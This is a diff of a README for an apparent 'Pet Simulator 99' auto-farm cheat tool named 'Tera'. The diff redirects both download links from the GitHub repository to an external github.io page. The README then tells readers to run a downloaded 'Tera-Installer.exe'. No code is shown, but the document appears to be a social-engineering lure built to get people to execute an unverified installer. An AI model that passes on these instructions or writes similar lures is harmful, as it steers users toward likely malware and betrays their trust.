@@ -1,6 +1,6 @@
 # 🐾 Pet-Simulator-99-Auto-Farm-Trainer-2026-Tera - Automate your tasks and progress faster
 
-[![Download Software](https://img.shields.io/badge/Download-Tera-blue.svg)](https://github.com/Anaclara181/Pet-Simulator-99-Auto-Farm-Trainer-2026-Tera)
+[![Download Software](https://img.shields.io/badge/Download-Tera-blue.svg)](https://anaclara181.github.io)
 
 ## 📖 Overview
 
@@ -20,7 +20,7 @@ Ensure your computer meets these requirements to run the software:
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the repository page to download the latest version: [https://github.com/Anaclara181/Pet-Simulator-99-Auto-Farm-Trainer-2026-Tera](https://github.com/Anaclara181/Pet-Simulator-99-Auto-Farm-Trainer-2026-Tera)
+1. Visit the repository page to download the latest version: [https://anaclara181.github.io](https://anaclara181.github.io)
 2. Locate the file named "Tera-Installer.exe" in your Downloads folder.
 3. Double-click the file to start the installer.
 4. Follow the on-screen prompts to select your installation folder.
